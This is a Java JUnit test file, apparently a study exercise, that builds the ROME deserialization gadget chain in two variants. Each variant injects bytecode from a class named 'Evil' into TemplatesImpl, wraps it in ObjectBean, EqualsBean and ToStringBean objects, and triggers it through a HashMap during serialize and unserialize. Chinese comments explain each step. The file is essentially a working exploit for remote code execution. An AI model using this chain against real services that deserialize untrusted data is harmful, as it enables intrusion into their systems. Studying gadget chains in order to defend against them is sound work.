package com.endlessshw.serialization.test;

import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ObjectBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.junit.jupiter.api.Test;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.HashMap;

import static com.endlessshw.serialization.util.SerializeUtil.serialize;
import static com.endlessshw.serialization.util.SerializeUtil.unSerialize;

/**
 * @author hasee
 * @version 1.0
 * @description: Gadgets 1
 * @date 2024/10/13 16:01
 */
public class GadgetsTest1 {

    @Test
    public void romeTest() throws NoSuchFieldException, NotFoundException, IOException, CannotCompileException, IllegalAccessException {
        // 1. 读取恶意类 bytes[] 并 sink 构造
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.getCtClass("com.endlessshw.serialization.util.Evil");
        byte[] bytes = ctClass.toBytecode();
        TemplatesImpl templates = new TemplatesImpl();
        // 要求 1 - 注入恶意字节码
        Field bytecodesField = templates.getClass().getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates, new byte[][]{bytes});
        // 要求 2 - 保证 _name 不为 null
        Field nameField = templates.getClass().getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "EndlessShw");

        // 2. 构造 chain，先让链断开
        ObjectBean objectBean = new ObjectBean(String.class, "EndlessShw");
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, new ToStringBean(Templates.class, templates));

        // 3. 构造 kick-off HashMap
        HashMap<Object, String> objectBeanStringHashMap = new HashMap<>();
        objectBeanStringHashMap.put(objectBean, "EndlessShw");

        // 4. 动态修改 ObjectBean 中的 EqualsBean
        Field equalsBeanField = objectBean.getClass().getDeclaredField("equalsBean");
        equalsBeanField.setAccessible(true);
        equalsBeanField.set(objectBean, equalsBean);

        String serialize = serialize(objectBeanStringHashMap);
        unSerialize(serialize);
    }

    @Test
    public void romeTest_su18() throws NoSuchFieldException, NotFoundException, IOException, CannotCompileException, IllegalAccessException {
        // 1. 读取恶意类 bytes[] 并 sink 构造
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.getCtClass("com.endlessshw.serialization.util.Evil");
        byte[] bytes = ctClass.toBytecode();
        TemplatesImpl templates = new TemplatesImpl();
        // 要求 1 - 注入恶意字节码
        Field bytecodesField = templates.getClass().getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates, new byte[][]{bytes});
        // 要求 2 - 保证 _name 不为 null
        Field nameField = templates.getClass().getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "EndlessShw");

        // 使用 TemplatesImpl 初始化被包装类，使其 ToStringBean 也使用 TemplatesImpl 初始化
        ObjectBean delegate = new ObjectBean(Templates.class, templates);

        // 使用 ObjectBean 封装这个类，使其在调用 hashCode 时会调用 ObjectBean 的 toString
        // 先封装一个无害的类
        ObjectBean root = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, "su18"));

        // 放入 Map 中
        HashMap<Object, Object> map = new HashMap<>();
        map.put(root, "su18");
        map.put("su19", "su20");

        // put 到 map 之后再反射写进去，避免触发漏洞
        Field field = ObjectBean.class.getDeclaredField("equalsBean");
        field.setAccessible(true);
        field.set(root, new EqualsBean(ObjectBean.class, delegate));

        String serialize = serialize(map);
        unSerialize(serialize);
    }

}
